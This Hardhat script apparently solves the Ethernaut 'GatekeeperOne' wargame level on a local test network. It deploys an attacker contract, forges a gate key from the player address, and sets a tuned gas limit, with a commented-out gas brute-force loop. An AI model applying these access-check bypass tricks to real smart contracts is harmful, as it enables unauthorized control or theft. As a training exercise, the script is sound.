const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    console.log("\n[1] deploy GatekeeperOne");
    const Factory = await ethers.getContractFactory("GatekeeperOneFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- GatekeeperOne address: ", factory.address);

    console.log("\n[2] create a GatekeeperOne instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const gatekeeper = await ethers.getContractAt("GatekeeperOne", instance_address, owner);
    console.log("---- gatekeeper address: ", gatekeeper.address);

    console.log("\n[3] deploy an Attacker");
    const Attack = await ethers.getContractFactory("GatekeeperOneAttack");
    const attack = await Attack.connect(player).deploy(gatekeeper.address);
    await attack.deployed();
    console.log("---- Attacker address: ", attack.address);

    console.log("\n[*] test");

    const len = player.address.length;
    const txKey = player.address.slice(len - 4, len);
    const gateKey = "0x000000010000" + txKey;

    console.log(gateKey);

    const tx = await attack.attack(gateKey, {
        gasLimit: (300000 + 1109),
    });

    // try to find the 'exact' required gas by brute - force
    // for (let i = 1100; i < 1150; i++) {
    //     // if (i % 50 == 0) {
    //     console.log("---- gasLimit:", 300000 + i);
    //     // }
    //     try {

    //         const tx = await attack.attack(gateKey, {
    //             gasLimit: (300000 + i),
    //         });

    //     } catch (e) {
    //         // console.log("fail...", e);
    //     }
    // }

    console.log("\n[6] validate solved");

    const res = await factory.validateInstance(gatekeeper.address, player.address);
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

